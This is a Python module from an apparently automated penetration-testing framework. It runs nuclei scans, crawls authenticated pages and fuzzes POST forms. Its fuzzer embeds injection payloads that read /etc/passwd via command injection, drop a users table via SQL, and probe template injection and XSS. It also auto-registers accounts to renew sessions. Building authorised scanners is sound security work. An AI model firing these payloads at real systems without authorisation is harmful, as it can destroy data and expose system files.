"""Vulnerability scanning role — nuclei execution and finding production.

VT-Spec T-01: Arguments validated via ToolExecutor.
VT-Spec D-01: Output capped, subprocess limited.
VT-Spec TA-002: Tech-aware template selection from recon findings.
"""

from __future__ import annotations

import logging
from pathlib import Path
from typing import Any, Dict, List, Optional, Set

from erebos.agents.base import AgentMessage, AgentRole, FindingsBus
from erebos.agents.tool_executor import ToolExecutor, ToolResult
from erebos.core.finding import Finding
from erebos.scanning.tech_detection import (
    detect_technologies_from_payloads,
    get_tags_for_technologies,
    get_template_dirs_for_technologies,
)

logger = logging.getLogger(__name__)


class VulnScanRole:
    """Vulnerability scanner agent — runs nuclei against discovered targets.

    Reads recon findings from bus to target specific services.
    Publishes vulnerability findings for exploit agent consumption.
    """

    def __init__(
        self,
        executor: ToolExecutor,
        bus: FindingsBus,
        agent_id: str,
        target: str,
        allowlist: Optional[List[str]] = None,
        auth_context: Optional[Any] = None,
        repos: Optional[List[Any]] = None,
    ):
        from pathlib import Path

        self._executor = executor
        self._bus = bus
        self._agent_id = agent_id
        self._target = target
        self._allowlist = [h.lower() for h in (allowlist or [])]
        self._findings: List[Finding] = []
        # Dedup key: (tool, title, url) — prevents identical nuclei hits from multiple template passes
        self._published_keys: set = set()
        # VT-Spec AUTH-01: Inject auth headers into tool commands
        self._auth_context = auth_context
        # Optional repo paths for route-aware crawl seeding
        self._repos: List[Any] = [Path(r) for r in (repos or [])]

    async def execute(self) -> Dict[str, Any]:
        """Run nuclei and publish findings."""
        import asyncio

        results: Dict[str, Any] = {"role": "vuln-scan", "findings": 0, "tools_run": []}

        # Gather targets from recon findings on bus
        targets = self._gather_targets()

        # VT-Spec TA-002: Detect technologies from recon findings to guide template selection
        detected_techs = self._detect_technologies()
        if detected_techs:
            logger.info(f"TA-002: Detected technologies from recon: {detected_techs}")

        # Run primary nuclei scan AND auth endpoint discovery in parallel.
        # Auth crawl is fast (~5s) and must complete while session is fresh;
        # nuclei on the primary target is the slow path (~minutes).
        primary_task = asyncio.create_task(
            self._run_nuclei(self._target, detected_techs)
        )
        auth_task = asyncio.create_task(self._discover_authenticated_endpoints())

        # Wait for auth crawl first (fast), then primary scan
        auth_result = await auth_task
        auth_endpoints = auth_result.get("urls", []) if auth_result else []
        auth_forms = auth_result.get("forms", []) if auth_result else []
        if auth_endpoints:
            logger.info(
                f"AUTH-01: Will scan {len(auth_endpoints)} endpoints, "
                f"{len(auth_forms)} forms"
            )

        # VT-Spec DAST-01: Fuzz POST forms IMMEDIATELY after discovery — session is
        # fresh and this must complete before nuclei exhausts the time budget.
        # Nuclei on the primary target keeps running in background (primary_task).
        if auth_forms:
            await self._fuzz_post_forms(auth_forms, detected_techs)

        nuclei_result = await primary_task
        if nuclei_result:
            results["tools_run"].append("nuclei")

        # Run against discovered subdomains (validated against allowlist)
        for sub_target in targets[:10]:  # Cap at 10 sub-targets
            if self._is_in_scope(sub_target):
                await self._run_nuclei(sub_target, detected_techs)

        # Scan authenticated endpoints discovered by the crawl.
        # Cap at 5 — these are typically nav/doc pages (e.g., /learn/vulnerability/*),
        # not high-value targets. POST form fuzzing handles the real app endpoints above.
        for endpoint_url in auth_endpoints[:5]:
            if self._is_in_scope(endpoint_url):
                await self._run_nuclei(endpoint_url, detected_techs)

        results["findings"] = len(self._findings)
        results["detected_technologies"] = list(detected_techs)
        return results

    async def _run_nuclei(
        self, target: str, detected_techs: Optional[Set[str]] = None
    ) -> Optional[ToolResult]:
        """Execute nuclei against a target with tech-aware template categories.

        VT-Spec TA-002: Template selection adapts based on technologies detected
        during recon. For example, Node.js/Express targets get NoSQL injection
        templates; PHP targets get LFI/RFI templates.

        Nuclei v3 quirk: multiple -t flags suppress JSONL output.
        We run once per template category and aggregate results.
        """
        templates_dir = self._find_nuclei_templates()
        if not templates_dir:
            # Single run with default templates (slow but functional)
            return await self._run_nuclei_single(target, extra_args=[])

        # Base template directories (always run)
        focus_dirs = [
            "http/technologies",
            "http/exposures",
            "http/misconfiguration",
        ]

        # VT-Spec TA-002: Expand templates based on detected tech stack
        tech_tags: Set[str] = set()
        if detected_techs:
            focus_dirs.extend(get_template_dirs_for_technologies(detected_techs))
            tech_tags = set(get_tags_for_technologies(detected_techs))

        # Deduplicate while preserving order
        seen_dirs: set = set()
        unique_dirs: List[str] = []
        for d in focus_dirs:
            if d not in seen_dirs:
                seen_dirs.add(d)
                unique_dirs.append(d)

        # VT-Spec TA-002: Also check bundled project templates (custom NoSQLi, etc.)
        bundled_templates = Path(__file__).resolve().parent.parent.parent.parent / "templates"

        last_result = None
        for d in unique_dirs:
            full_path = templates_dir / d
            # Nuclei v3 requires -dast flag to execute dast/ templates
            dast_flag = ["-dast"] if d.startswith("dast/") else []
            if full_path.is_dir():
                result = await self._run_nuclei_single(
                    target, extra_args=["-t", str(full_path)] + dast_flag
                )
                if result:
                    last_result = result
            # Fallback: check bundled templates for dirs missing from community set
            elif (bundled_templates / d).is_dir():
                result = await self._run_nuclei_single(
                    target, extra_args=["-t", str(bundled_templates / d)] + dast_flag
                )
                if result:
                    last_result = result

        # VT-Spec TA-002: Run tag-based scan for tech-specific vulnerabilities
        # (catches templates scattered across dirs that match by tag)
        if tech_tags:
            tags_str = ",".join(sorted(tech_tags))
            logger.info(f"TA-002: Running nuclei with tags: {tags_str}")
            result = await self._run_nuclei_single(
                target, extra_args=["-tags", tags_str, "-dast"]
            )
            if result:
                last_result = result

        return last_result

    async def _run_nuclei_single(self, target: str, extra_args: List[str]) -> Optional[ToolResult]:
        """Run a single nuclei invocation and parse findings."""
        try:
            args = ["-u", target, "-jsonl", "-nc"] + extra_args
            # VT-Spec AUTH-01: Inject auth headers if available
            if self._auth_context and self._auth_context.has_auth:
                args.extend(self._auth_context.nuclei_args())

            result = await self._executor.run(
                "nuclei",
                args=args,
                timeout=90,
            )

            if result.exit_code == 0 and result.stdout:
                findings = self._parse_nuclei_output(result.stdout)
                for f in findings:
                    # VT-Spec AC-005: Validate parsed finding target against allowlist
                    if self._is_in_scope(f.target or target):
                        self._findings.append(f)
                        self._publish_finding(f)
                    else:
                        logger.warning(
                            f"AC-005: Dropping finding with out-of-scope target: {f.target}"
                        )

            return result
        except (ValueError, FileNotFoundError) as e:
            logger.warning(f"VulnScan nuclei skipped: {e}")
            return None

    def _find_nuclei_templates(self) -> Optional[Path]:
        """Discover nuclei templates directory.

        Priority: repo-bundled → home dir → system-wide.
        """
        # VT-Spec: Prefer bundled templates shipped with the repo
        repo_root = Path(__file__).resolve().parent.parent.parent.parent
        bundled = repo_root / "templates" / "nuclei"
        if bundled.is_dir() and (bundled / "http").is_dir():
            return bundled

        candidates = [
            Path.home() / "nuclei-templates",
            Path.home() / ".local" / "nuclei-templates",
            Path("/opt/nuclei-templates"),
        ]
        for p in candidates:
            if p.is_dir() and (p / "http").is_dir():
                return p
        return None

    def _parse_nuclei_output(self, output: str) -> List[Finding]:
        """Parse nuclei JSON output via canonical NucleiParser.

        VT-Spec T-01: Wrapped in try/except — never crashes on parse failure.
        """
        try:
            from erebos.parsers.nuclei import NucleiParser

            parser = NucleiParser()
            return parser.parse(output)
        except Exception as e:
            # T-01: Log and continue — never crash role on malformed output
            logger.warning(f"T-01: NucleiParser failed, falling back to empty: {e}")
            return []

    async def _discover_authenticated_endpoints(self) -> Optional[Dict[str, Any]]:
        """Crawl the target with auth cookies to discover protected endpoints.

        VT-Spec AUTH-01: After auth acquisition, discover internal endpoints
        that are only reachable when authenticated (e.g., /app/*, /admin/*).
        Uses a lightweight httpx crawl — extracts links from HTML responses.
        """
        if not self._auth_context or not self._auth_context.has_auth:
            return None

        try:
            import httpx
            from html.parser import HTMLParser
            from urllib.parse import urljoin, urlparse

            base_url = self._target
            if not base_url.startswith("http"):
                base_url = f"https://{base_url}"

            # Build auth from context — use cookies param (not header) so httpx
            # includes them on redirects automatically via its cookie jar.
            cookies_dict = self._auth_context.get_cookies() or {}
            extra_headers: Dict[str, str] = {}
            auth_headers = self._auth_context.get_headers()
            if auth_headers:
                extra_headers.update(auth_headers)

            # Validate session is still alive; re-acquire if expired.
            cookies_dict = await self._ensure_valid_session(base_url, cookies_dict)

            # Simple HTML link and form extractor (also extracts Markdown-style links)
            class LinkExtractor(HTMLParser):
                def __init__(self):
                    super().__init__()
                    self.links: List[str] = []
                    self.forms: List[Dict[str, Any]] = []
                    self._current_form: Optional[Dict[str, Any]] = None

                def handle_starttag(self, tag, attrs):
                    attrs_dict = dict(attrs)
                    if tag == "a":
                        href = attrs_dict.get("href")
                        if href:
                            self.links.append(href)
                    elif tag == "form":
                        self._current_form = {
                            "action": attrs_dict.get("action", ""),
                            "method": attrs_dict.get("method", "GET").upper(),
                            "fields": [],
                        }
                    elif tag == "input" and self._current_form is not None:
                        name = attrs_dict.get("name")
                        input_type = attrs_dict.get("type", "text").lower()
                        if name and input_type not in ("submit", "button", "hidden", "csrf"):
                            self._current_form["fields"].append(name)
                    elif tag == "textarea" and self._current_form is not None:
                        name = attrs_dict.get("name")
                        if name:
                            self._current_form["fields"].append(name)

                def handle_endtag(self, tag):
                    if tag == "form" and self._current_form is not None:
                        if self._current_form["fields"]:
                            self.forms.append(self._current_form)
                        self._current_form = None

                def handle_data(self, data):
                    # Extract Markdown links: [text](/path)
                    import re

                    for match in re.finditer(r"\[[^\]]*\]\((/[^)]+)\)", data):
                        self.links.append(match.group(1))

            discovered: List[str] = []
            crawled_forms: List[Dict[str, Any]] = []
            seen_urls: set = set()
            host = urlparse(base_url).netloc

            # Paths that must never be seeded or crawled:
            # - session-destructive (/logout) would log the user out mid-scan
            # - auth forms (/login, /register) waste crawl budget and never contain
            #   app-specific POST forms worth fuzzing
            skip_paths = {
                "/", "/login", "/register", "/signup", "/logout",
                "/signout", "/forgotpw", "/reset-password", "/resetpw",
            }

            # Seed URLs: common authenticated entry points + post-login landing pages
            seed_paths = [
                "/", "/app", "/dashboard", "/admin", "/home", "/panel", "/learn",
            ]

            # If repos were provided, extract defined routes and inject as seeds.
            # This is critical for apps where the landing page doesn't link to
            # protected routes (e.g., DVNA's /app redirects to /learn with no
            # links to /app/ping, /app/usersearch, etc.).
            if self._repos:
                try:
                    from erebos.exploits.repo_analyzer import RepoAnalyzer

                    analyzer = RepoAnalyzer(repo_paths=self._repos)
                    repo_routes = analyzer.extract_all_routes()
                    # Filter out dynamic paths (contain PARAM) and skip_paths
                    # (session-destructive routes like /logout must never be seeded).
                    for route in repo_routes:
                        if (
                            "PARAM" not in route
                            and route not in seed_paths
                            and route not in skip_paths
                        ):
                            seed_paths.append(route)
                    logger.info(
                        f"AUTH-01: Seeded {len(repo_routes)} routes from repo source code"
                    )
                except Exception as e:
                    logger.warning(f"AUTH-01: Route extraction from repos failed: {e}")
            queue = [f"{base_url}{p}" for p in seed_paths]

            async with httpx.AsyncClient(
                timeout=10.0,
                follow_redirects=True,
                verify=False,
                cookies=cookies_dict,
                headers=extra_headers if extra_headers else None,
            ) as client:
                crawl_budget = 30  # Max pages to fetch
                for url in queue:
                    if crawl_budget <= 0:
                        break
                    if url in seen_urls:
                        continue
                    seen_urls.add(url)

                    try:
                        resp = await client.get(url)
                        if resp.status_code != 200:
                            continue
                        crawl_budget -= 1

                        # Extract links and forms
                        extractor = LinkExtractor()
                        extractor.feed(resp.text)

                        for link in extractor.links:
                            abs_url = urljoin(str(resp.url), link)
                            parsed = urlparse(abs_url)
                            # Only follow same-host links
                            if parsed.netloc != host:
                                continue
                            # Skip static assets and fragments
                            if any(
                                parsed.path.endswith(ext)
                                for ext in (".js", ".css", ".png", ".jpg", ".gif", ".svg", ".ico")
                            ):
                                continue
                            # Never visit destructive/public paths
                            if parsed.path in skip_paths:
                                continue
                            clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                            if clean_url not in seen_urls:
                                queue.append(clean_url)
                                if clean_url not in discovered:
                                    discovered.append(clean_url)

                        # Build fuzzable URLs from forms (nuclei DAST needs params)
                        from urllib.parse import urlencode

                        for form in extractor.forms:
                            action = form["action"] or urlparse(str(resp.url)).path
                            form_url = urljoin(str(resp.url), action)
                            form_parsed = urlparse(form_url)
                            if form_parsed.netloc != host:
                                continue
                            if form_parsed.path in skip_paths:
                                continue
                            # Store full form metadata for POST fuzzing
                            crawled_forms.append({
                                "url": form_url,
                                "method": form["method"],
                                "fields": form["fields"],
                                "source_page": str(resp.url),
                            })
                            # Also create URL with dummy params for nuclei GET fuzz
                            params = {f: "test" for f in form["fields"]}
                            fuzzable = f"{form_url}?{urlencode(params)}"
                            if fuzzable not in discovered:
                                discovered.append(fuzzable)

                    except httpx.HTTPError:
                        continue

            logger.info(
                f"AUTH-01: Authenticated crawl discovered {len(discovered)} endpoints, "
                f"{len(crawled_forms)} forms"
            )
            return {
                "urls": discovered[:20],
                "forms": crawled_forms[:15],
            }

        except Exception as e:
            logger.warning(f"AUTH-01: Authenticated endpoint discovery failed: {e}")
            return None

    async def _fuzz_post_forms(
        self, forms: List[Dict[str, Any]], detected_techs: Optional[Set[str]] = None
    ) -> None:
        """Fuzz POST forms directly with injection payloads via httpx.

        VT-Spec DAST-01: Nuclei DAST only fuzzes GET query parameters. This method
        handles POST form bodies that nuclei cannot test. Submits common injection
        payloads and analyzes responses for vulnerability indicators.
        """
        import httpx
        from urllib.parse import urlparse

        if not self._auth_context or not self._auth_context.has_auth:
            return

        cookies_dict = self._auth_context.get_cookies()

        # Payload sets per vulnerability class
        payload_sets: Dict[str, List[Dict[str, Any]]] = {
            "cmdi": {
                "payloads": [
                    "127.0.0.1;id",
                    "127.0.0.1|id",
                    "$(id)",
                    "`id`",
                    "127.0.0.1;cat /etc/passwd",
                ],
                "indicators": [
                    "uid=", "root:", "/bin/bash", "/bin/sh",
                    "daemon:", "nobody:",
                ],
                "severity": "CRITICAL",
                "vuln_id": "cmdi-post-form",
                "title": "OS Command Injection (POST form)",
                "cwe": "CWE-78",
            },
            "sqli": {
                "payloads": [
                    "' OR '1'='1",
                    "' OR 1=1--",
                    "'; DROP TABLE users--",
                    "1' AND '1'='1",
                    "admin'--",
                ],
                "indicators": [
                    "SQL syntax", "mysql", "sqlite", "postgresql",
                    "ORA-", "SQLSTATE", "unclosed quotation",
                    "syntax error", "unterminated",
                ],
                "severity": "CRITICAL",
                "vuln_id": "sqli-post-form",
                "title": "SQL Injection (POST form)",
                "cwe": "CWE-89",
            },
            "nosqli": {
                "payloads": [
                    "admin' || '1'=='1",
                    '{"$gt":""}',
                    '{"$ne":"invalid"}',
                    "[$ne]=x",
                ],
                "indicators": [
                    "MongoError", "BSON", "ObjectId",
                    "CastError", "$where",
                ],
                "severity": "HIGH",
                "vuln_id": "nosqli-post-form",
                "title": "NoSQL Injection (POST form)",
                "cwe": "CWE-943",
            },
            "ssti": {
                "payloads": [
                    "{{7*7}}",
                    "${7*7}",
                    "<%= 7*7 %>",
                    "#{7*7}",
                    "{{constructor.constructor('return 1')()}}",
                ],
                "indicators": ["49"],
                "severity": "HIGH",
                "vuln_id": "ssti-post-form",
                "title": "Server-Side Template Injection (POST form)",
                "cwe": "CWE-1336",
            },
            "xss": {
                "payloads": [
                    '<script>alert(1)</script>',
                    '"><img src=x onerror=alert(1)>',
                    "javascript:alert(1)",
                ],
                "indicators": [
                    "<script>alert(1)</script>",
                    'onerror=alert(1)',
                ],
                "severity": "MEDIUM",
                "vuln_id": "xss-post-form",
                "title": "Cross-Site Scripting (POST form)",
                "cwe": "CWE-79",
            },
        }

        logger.info(f"DAST-01: Fuzzing {len(forms)} POST forms with injection payloads")
        self._bus.publish(
            "status",
            {
                "status": "dast_fuzzing",
                "target": self._target,
                "forms": len(forms),
                "message": f"DAST-01: fuzzing {len(forms)} POST forms with injection payloads",
            },
        )
        fuzz_findings_before = len(self._findings)

        async with httpx.AsyncClient(
            timeout=15.0,
            follow_redirects=True,
            verify=False,
            cookies=cookies_dict,
        ) as client:
            for form in forms:
                if form["method"] != "POST":
                    continue
                if not form["fields"]:
                    continue

                # Get baseline response (normal input)
                baseline_data = {f: "test" for f in form["fields"]}
                try:
                    baseline_resp = await client.post(form["url"], data=baseline_data)
                    baseline_text = baseline_resp.text
                except httpx.HTTPError:
                    continue

                # Test each vulnerability class
                for vuln_class, config in payload_sets.items():
                    for payload in config["payloads"]:
                        for field in form["fields"]:
                            fuzz_data = baseline_data.copy()
                            fuzz_data[field] = payload

                            try:
                                resp = await client.post(form["url"], data=fuzz_data)
                            except httpx.HTTPError:
                                continue

                            # Check for vulnerability indicators in response
                            response_text = resp.text
                            matched_indicators = [
                                ind for ind in config["indicators"]
                                if ind in response_text and ind not in baseline_text
                            ]

                            if matched_indicators:
                                # Confirmed vulnerability — indicator in response
                                from erebos.core.finding import (
                                    Finding, FindingEvidence, Phase,
                                )

                                finding = Finding(
                                    title=f"{config['title']}: {field} @ {urlparse(form['url']).path}",
                                    severity=config["severity"],
                                    description=(
                                        f"POST form at {form['url']} is vulnerable to "
                                        f"{vuln_class} via the '{field}' parameter. "
                                        f"Payload: {payload!r} triggered indicator(s): "
                                        f"{matched_indicators}"
                                    ),
                                    target=form["url"],
                                    tool="erebos-form-fuzzer",
                                    evidence=FindingEvidence(
                                        url=form["url"],
                                        payload=payload,
                                        output=f"Indicators: {matched_indicators}",
                                    ),
                                    cwe=config.get("cwe"),
                                    exploitation_status="exploited",
                                    phase_found=Phase.VULN_SCAN,
                                )
                                self._findings.append(finding)
                                self._publish_finding(finding)
                                logger.info(
                                    f"DAST-01: {config['severity'].upper()} — "
                                    f"{vuln_class} in {field} @ {form['url']}"
                                )
                                # Move to next field after first confirmed vuln
                                break
                        else:
                            continue
                        break  # Found vuln for this class+form, move on

        new_findings = len(self._findings) - fuzz_findings_before
        self._bus.publish(
            "status",
            {
                "status": "dast_fuzzing_done",
                "target": self._target,
                "forms_tested": len(forms),
                "findings": new_findings,
                "message": f"DAST-01: form fuzzing complete — {new_findings} finding(s) from {len(forms)} form(s)",
            },
        )

    async def _ensure_valid_session(
        self, base_url: str, cookies_dict: Dict[str, str]
    ) -> Dict[str, str]:
        """Validate session cookie and re-acquire if expired.

        VT-Spec AUTH-01: Sessions may expire between auth acquisition and crawl.
        This method checks if the current session redirects to /login and, if so,
        performs a fresh registration to get a new valid session.
        """
        import secrets

        import httpx
        from urllib.parse import urlparse

        # Quick probe: if authenticated root doesn't redirect to login, session is valid
        try:
            async with httpx.AsyncClient(
                timeout=10.0, follow_redirects=True, verify=False,
                cookies=cookies_dict,
            ) as probe:
                resp = await probe.get(f"{base_url}/")
                final_path = urlparse(str(resp.url)).path
                if final_path not in ("/login", "/signin", "/sign-in"):
                    return cookies_dict  # Session is valid
        except httpx.HTTPError:
            pass

        # Session expired — re-acquire via fresh registration
        logger.warning("AUTH-01: Session expired, re-acquiring via registration")
        try:
            from erebos.auth.form_introspector import (
                build_registration_payload,
                find_register_form,
            )

            test_username = f"erebos_{secrets.token_hex(4)}"
            async with httpx.AsyncClient(
                timeout=15.0, follow_redirects=False, verify=False
            ) as client:
                # Fetch register page to get form + initial session cookie
                await client.get(f"{base_url}/register")
                resp = await client.get(f"{base_url}/register")
                if resp.status_code != 200:
                    return cookies_dict

                form = find_register_form(resp.text)
                if not form:
                    return cookies_dict

                payload = build_registration_payload(
                    form=form,
                    username=test_username,
                    password=f"Vt{secrets.token_hex(6)}!",
                    email=f"{test_username}@erebos.local",
                )
                await client.post(
                    f"{base_url}{form.action or '/register'}", data=payload
                )

                # Extract session from client jar
                cookie_keywords = ("sess", "sid", "token", "auth", "jwt", "connect")
                for name, value in client.cookies.items():
                    if any(kw in name.lower() for kw in cookie_keywords):
                        logger.info(f"AUTH-01: Re-acquired session cookie: {name}")
                        new_cookies = {name: value}
                        # Update auth context for nuclei header injection
                        from erebos.auth import AuthCredential, AuthType

                        self._auth_context.add_static(
                            AuthCredential(
                                auth_type=AuthType.COOKIE, cookies=new_cookies
                            )
                        )
                        return new_cookies

        except Exception as e:
            logger.warning(f"AUTH-01: Session re-acquisition failed: {e}")

        return cookies_dict

    def _gather_targets(self) -> List[str]:
        """Read recon and web-discovery findings from bus to discover additional targets."""
        targets: List[str] = []
        seen: set = set()

        for msg in self._bus.subscribe(roles=[AgentRole.RECON], message_types=["finding"]):
            target = msg.payload.get("target", "")
            if target and target not in seen:
                seen.add(target)
                targets.append(target)

        # VT-Spec R5: Consume web-discovery attack_surface for authenticated endpoints
        for msg in self._bus.subscribe(
            roles=[AgentRole.WEB_DISCOVERY], message_types=["attack_surface"]
        ):
            endpoints = msg.payload.get("endpoints", [])
            for ep in endpoints:
                url = ep.get("url", "")
                if url and url not in seen and ep.get("status_code") == 200:
                    seen.add(url)
                    targets.append(url)

        return targets

    def _detect_technologies(self) -> Set[str]:
        """VT-Spec TA-002: Read recon/vuln-scan findings from bus to detect tech stack.

        Delegates to shared tech_detection module for consistent detection
        across fleet and classic modes.
        """
        payloads: List[Dict[str, Any]] = []
        for msg in self._bus.subscribe(
            roles=[AgentRole.RECON, AgentRole.VULN_SCAN], message_types=["finding"]
        ):
            payloads.append(msg.payload)

        return detect_technologies_from_payloads(payloads)

    def _is_in_scope(self, target: str) -> bool:
        """VT-Spec AC-005: Validate target against allowlist."""
        if not self._allowlist:
            return True
        from urllib.parse import urlparse

        clean = target.lower().strip()
        # Extract hostname from URL or host:port
        if "://" in clean:
            clean = urlparse(clean).hostname or clean
        else:
            clean = clean.split(":")[0]  # strip port
        return any(clean == allowed or clean.endswith(f".{allowed}") for allowed in self._allowlist)

    def _publish_finding(self, finding: Finding) -> None:
        """Publish finding with S-01 role verification and deduplication."""
        # Dedup: skip if same tool+title+url already published this session
        ev_url = finding.evidence.url if finding.evidence else ""
        dedup_key = (finding.tool or "", finding.title or "", ev_url or "")
        if dedup_key in self._published_keys:
            logger.debug("Skipping duplicate finding: %s @ %s", finding.title, ev_url)
            return
        self._published_keys.add(dedup_key)
        self._bus.publish(
            AgentMessage(
                id=f"{self._agent_id}-finding-{len(self._findings)}",
                role=AgentRole.VULN_SCAN,  # S-01: Always own role
                message_type="finding",
                payload=finding.model_dump(mode="json"),
            )
        )
